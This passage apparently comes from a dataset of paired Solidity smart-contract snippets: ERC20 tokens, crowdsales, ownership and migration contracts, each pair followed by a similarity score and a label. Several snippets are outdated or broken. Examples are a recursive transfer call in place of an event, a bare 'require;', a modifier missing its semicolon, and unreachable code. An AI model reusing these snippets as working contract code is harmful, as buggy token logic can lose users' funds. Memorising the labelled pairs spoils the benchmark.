        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract Interface {
     function transfer(address _to, uint256 _value) public returns(bool);
     function balanceOf(address _owner) public constant returns(uint256); 
}",0.927104271,"contract ForeignToken {

    function balanceOf(address _owner) constant public returns(uint256);



    function transfer(address _to, uint256 _value) public returns(bool);

}",1,,,,,
"contract ERC20Name {
    
    string public name;
    string public symbol;
    uint8 public decimals = 2;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    
    event Burn(address indexed from, uint256 value);

    
    function ERC20Name(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
}",0.90051246,"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract Migrations {
    address public owner;
    uint public last_completed_migration;

    modifier restricted() {
        if (msg.sender == owner) _;
    }

    function Migrations() {
         owner = msg.sender;
    }

    function setCompleted(uint completed) restricted {
        last_completed_migration = completed;
    }

    function upgrade(address new_address) public restricted {
        Migrations upgraded = Migrations(new_address);
        upgraded.setCompleted(last_completed_migration);
    }
}",0.944079327,"contract Migrations {
    address public owner;
    uint public last_completed_migration;

    modifier restricted() {
        if (msg.sender == owner) _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function setCompleted(uint completed) public restricted {
        last_completed_migration = completed;
    }

    function upgrade(address new_address) public restricted {
        Migrations upgraded = Migrations(new_address);
        upgraded.setCompleted(last_completed_migration);
    }
}",1,,,,,
"contract StandardToken {

    function transfer(address _to, uint256 _value) returns (bool success) {
        
        
        
        
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        
        
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        approve(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}",0.979587318,"contract SLAB is Token {

    function transfer(address _to, uint256 _value) returns (bool success) {
        
        
        
        
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        
        
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}",1,,,,,
"contract NMR { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           



    
    
    function NMRToken() {
        balances[msg.sender] = 1000000000000000000000000000;    
        totalSupply = 1000000000000000000000000000;                        
        name = ""NMRToken"";                                   
        decimals = 18;                                               
        symbol = ""NMR"";                                             
        unitsOneEthCanBuy = 10000;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { require; }
        return true;
    }
}",0.959611208,"contract NKN  is StandardToken { 


    


    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           


    
    
    function NKN() {
        balances[msg.sender] = 1000000000 ;               
        totalSupply = 1000000000000000000000000000;                        
        name = ""NKN"";                                   
        decimals = 18;                                               
        symbol = ""NKN"";                                           
        unitsOneEthCanBuy =6100;                                      
        fundsWallet = msg.sender;                                    
    }


    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);


        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;


        Transfer(fundsWallet, msg.sender, amount); 


        
        fundsWallet.transfer(msg.value);                               
    }


    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);


        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",1,,,,,
"contract UnixERC20 is StandardToken {
    function() {
        throw;
    }

    string public name;
    uint8 public decimals;
    string public symbol;
    string public version = 'H1.0';

    function UnixERC20() {
        balances[msg.sender] = 5500000000;
        totalSupply = 5500000000;
        name = ""UNIWORTH COIN"";
        decimals = 0;
        symbol = ""UNIX"";
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        if (!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { 
            throw; 
        }
        return true;
    }
}",0.920297949,"contract ERC20Token is StandardToken {



    function () {

        

        throw;

    }



    



    

    string public name;                  

    uint8 public decimals;               

    string public symbol;                 

    string public version = 'H1.0';       















    function ERC20Token(

        ) {

        balances[msg.sender] = 140000000000000000;               

        totalSupply = 140000000000000000 ;                        

        name = ""Brainmab"";                                   

        decimals = 18;                            

        symbol = ""BRN"";                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        

        

        

        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",1,,,,,
"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal; uint public amountRaised; uint public deadline; uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    event GoalReached(address beneficiary, uint amountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);
    bool crowdsaleClosed = false;

    

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        token addressOfTokenUsedAsReward
    ) {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function (){
        require (!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    function safeWithdrawal() afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.980095783,"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 wei;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 wei;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",1,,,,,
"contract DappTokenSale {
        address admin;
        DappToken public tokenContract;
        uint256 public tokenPrice;
        uint256 public tokensSold;

        event Sell(address _buyer, uint256 _amount);

        function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {
            admin = msg.sender;
            tokenContract = _tokenContract;
            tokenPrice = _tokenPrice;
        }

        function multiply(uint x, uint y) internal pure returns (uint z) {
            require(y == 0 || (z = x * y) / y == x);
        }

        function buyTokens(uint256 _numberOfTokens) public payable {
            require(msg.value == multiply(_numberOfTokens, tokenPrice));
            require(tokenContract.balanceOf(this) >= _numberOfTokens);
            require(tokenContract.transfer(msg.sender, _numberOfTokens));

            tokensSold += _numberOfTokens;

            emit Sell(msg.sender, _numberOfTokens);
        }

      

        function endSale() public {
                
                require (msg.sender == admin);

                 
                require(tokenContract.transfer(admin,tokenContract.balanceOf(this)));


                
                selfdestruct(admin);
        }
    }",0.972475283,"contract DappTokenSale {

    address admin;

    DappToken public tokenContract;

    uint256 public tokenPrice;

    uint256 public tokensSold;



    event Sell(address _buyer, uint256 _amount);



    function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {

        admin = msg.sender;

        tokenContract = _tokenContract;

        tokenPrice = _tokenPrice;

    }



    function multiply(uint x, uint y) internal pure returns (uint z) {

        require(y == 0 || (z = x * y) / y == x);

    }



    function buyTokens(uint256 _numberOfTokens) public payable {

        require(msg.value == multiply(_numberOfTokens, tokenPrice));

        require(tokenContract.balanceOf(this) >= _numberOfTokens);

        require(tokenContract.transfer(msg.sender, _numberOfTokens));



        tokensSold += _numberOfTokens;



        Sell(msg.sender, _numberOfTokens);

    }



    function endSale() public {

        require(msg.sender == admin);

        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));



        

        

        admin.transfer(address(this).balance);

    }

}",1,,,,,
"contract PUMPHODL is ERC20 {

    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;

    string public constant name = ""PUMPHODL"";
    string public constant symbol = ""PHOD"";
    uint public constant decimals = 8;

    uint256 public totalSupply = 1000000000e8;
    uint256 public totalDistributed = 300000000e8;
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Distr(address indexed to, uint256 amount);
    event DistrFinished();

    event Burn(address indexed burner, uint256 value);

    bool public distributionFinished = false;

    modifier canDistr() {
        require(!distributionFinished);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }

    function PUMPHODL () public {
        owner = msg.sender;
        value = 10000e8;
        distr(owner, totalDistributed);
    }

    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }

    function enableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }

    function disableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }

    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function airdrop(address[] addresses) onlyOwner canDistr public {

        require(addresses.length <= 255);
        require(value <= totalRemaining);

        for (uint i = 0; i < addresses.length; i++) {
            require(value <= totalRemaining);
            distr(addresses[i], value);
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {

        require(addresses.length <= 255);
        require(amount <= totalRemaining);

        for (uint i = 0; i < addresses.length; i++) {
            require(amount <= totalRemaining);
            distr(addresses[i], amount);
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {

        require(addresses.length <= 255);
        require(addresses.length == amounts.length);

        for (uint8 i = 0; i < addresses.length; i++) {
            require(amounts[i] <= totalRemaining);
            distr(addresses[i], amounts[i]);

            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }

    function () external payable {
            getTokens();
     }

    function getTokens() payable canDistr onlyWhitelist public {

        if (value > totalRemaining) {
            value = totalRemaining;
        }

        require(value <= totalRemaining);

        address investor = msg.sender;
        uint256 toGive = value;

        distr(investor, toGive);

        if (toGive > 0) {
            blacklist[investor] = true;
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        value = value.div(100000).mul(99999);
    }

    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }

    
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);

        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }

    function withdraw() onlyOwner public {
        uint256 etherBalance = this.balance;
        owner.transfer(etherBalance);
    }

    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        
        

        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}",0.993165712,"contract	ProNetwork  is ERC20 {

    

    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

    mapping (address => bool) public blacklist;



    string public constant name = ""ProNetwork"";

    string public constant symbol = ""ProNet"";

    uint public constant decimals = 8;

    

    uint256 public totalSupply = 10000000000e8;

    uint256 public totalDistributed = 1000000000e8;

    uint256 public totalRemaining = totalSupply.sub(totalDistributed);

    uint256 public value;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    

    event Distr(address indexed to, uint256 amount);

    event DistrFinished();

    

    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;

    

    modifier canDistr() {

        require(!distributionFinished);

        _;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    modifier onlyWhitelist() {

        require(blacklist[msg.sender] == false);

        _;

    }

    

    function ProNetwork () public {

        owner = msg.sender;

        value = 4000e8;

        distr(owner, totalDistributed);

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }

    

    function enableWhitelist(address[] addresses) onlyOwner public {

        for (uint i = 0; i < addresses.length; i++) {

            blacklist[addresses[i]] = false;

        }

    }



    function disableWhitelist(address[] addresses) onlyOwner public {

        for (uint i = 0; i < addresses.length; i++) {

            blacklist[addresses[i]] = true;

        }

    }



    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        DistrFinished();

        return true;

    }

    

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalDistributed = totalDistributed.add(_amount);

        totalRemaining = totalRemaining.sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Distr(_to, _amount);

        Transfer(address(0), _to, _amount);

        return true;

        

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }

    

    function airdrop(address[] addresses) onlyOwner canDistr public {

        

        require(addresses.length <= 255);

        require(value <= totalRemaining);

        

        for (uint i = 0; i < addresses.length; i++) {

            require(value <= totalRemaining);

            distr(addresses[i], value);

        }

	

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }

    

    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {

        

        require(addresses.length <= 255);

        require(amount <= totalRemaining);

        

        for (uint i = 0; i < addresses.length; i++) {

            require(amount <= totalRemaining);

            distr(addresses[i], amount);

        }

	

        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }

    

    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {



        require(addresses.length <= 255);

        require(addresses.length == amounts.length);

        

        for (uint8 i = 0; i < addresses.length; i++) {

            require(amounts[i] <= totalRemaining);

            distr(addresses[i], amounts[i]);

            

            if (totalDistributed >= totalSupply) {

                distributionFinished = true;

            }

        }

    }

    

    function () external payable {

            getTokens();

     }

    

    function getTokens() payable canDistr onlyWhitelist public {

        

        if (value > totalRemaining) {

            value = totalRemaining;

        }

        

        require(value <= totalRemaining);

        

        address investor = msg.sender;

        uint256 toGive = value;

        

        distr(investor, toGive);

        

        if (toGive > 0) {

            blacklist[investor] = true;

        }



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

        

        value = value.div(100000).mul(99999);

    }



    function balanceOf(address _owner) constant public returns (uint256) {

	    return balances[_owner];

    }



    

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        ForeignToken t = ForeignToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }

    

    function withdraw() onlyOwner public {

        uint256 etherBalance = this.balance;

        owner.transfer(etherBalance);

    }

    

    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);

        

        



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        Burn(burner, _value);

    }

    

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }





}",1,,,,,
"contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public { owner = msg.sender;  }

  modifier onlyOwner() {     
      address sender =  msg.sender;
      address _owner = owner;
      require(msg.sender == _owner);    
      _;  
  }

  function transferOwnership(address newOwner) onlyOwner public { 
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}",0.919432577,"contract Ownable {

    address public owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    

    constructor () public {

        owner = msg.sender;

    }



    

    modifier onlyOwner() {

        require(msg.sender == owner, ""Only contract owner can call this function"");

        _;

    }



    

    function transferOwnership(address newOwner) public onlyOwner {

        require(newOwner != address(0));

        emit OwnershipTransferred(owner, newOwner);

        owner = newOwner;

    }



}",1,,,,,
"contract SwordToken is MintableToken {

    string public constant name = ""Sword Coin""; 
    string public constant symbol = ""SWDC"";
    uint8 public constant decimals = 18;

    function getTotalSupply() view public returns (uint256) {
        return totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        super.transfer(_to, _value);
    }

}",0.937483328,"contract BrickToken is MintableToken {



    string public constant name = ""Brick""; 

    string public constant symbol = ""BRK"";

    uint8 public constant decimals = 18;



    function getTotalSupply() view public returns (uint256) {

        return totalSupply;

    }

    

    function transfer(address _to, uint256 _value) public returns (bool) {

        super.transfer(_to, _value);

    }

    

}",1,,,,,
"contract Owned {
    address owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (msg.sender == owner) _
    }
}",0.977579638,"contract Owned {
    address owner;

    modifier onlyowner() {
        if (msg.sender == owner) {
            _;
        }
    }

    function Owned() {
        owner = msg.sender;
    }
}",4,*,,,,
"contract DudeCoin {
                    
                    string public name;
                    string public symbol;
                    uint8 public decimals = 2;
                    
                    uint256 public totalSupply;

                    
                    mapping (address => uint256) public balanceOf;
                    mapping (address => mapping (address => uint256)) public allowance;

                    
                    event Transfer(address indexed from, address indexed to, uint256 value);

                    
                    event Burn(address indexed from, uint256 value);

                    
                    function DudeCoin(
                        uint256 initialSupply,
                        string tokenName,
                        string tokenSymbol
                    ) public {
                        totalSupply = initialSupply * 10 ** uint256(decimals);  
                        balanceOf[msg.sender] = totalSupply;                
                        name = tokenName;                                   
                        symbol = tokenSymbol;                               
                    }

                    
                    function _transfer(address _from, address _to, uint _value) internal {
                        
                        require(_to != 0x0);
                        
                        require(balanceOf[_from] >= _value);
                        
                        require(balanceOf[_to] + _value > balanceOf[_to]);
                        
                        uint previousBalances = balanceOf[_from] + balanceOf[_to];
                        
                        balanceOf[_from] -= _value;
                        
                        balanceOf[_to] += _value;
                        Transfer(_from, _to, _value);
                        
                        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
                    }

                    
                    function transfer(address _to, uint256 _value) public {
                        _transfer(msg.sender, _to, _value);
                    }

                    
                    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
                        require(_value <= allowance[_from][msg.sender]);     
                        allowance[_from][msg.sender] -= _value;
                        _transfer(_from, _to, _value);
                        return true;
                    }

                    
                    function approve(address _spender, uint256 _value) public
                        returns (bool success) {
                        allowance[msg.sender][_spender] = _value;
                        return true;
                    }

                    
                    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
                        public
                        returns (bool success) {
                        tokenRecipient spender = tokenRecipient(_spender);
                        if (approve(_spender, _value)) {
                            spender.receiveApproval(msg.sender, _value, this, _extraData);
                            return true;
                        }
                    }

                    
                    function burn(uint256 _value) public returns (bool success) {
                        require(balanceOf[msg.sender] >= _value);   
                        balanceOf[msg.sender] -= _value;            
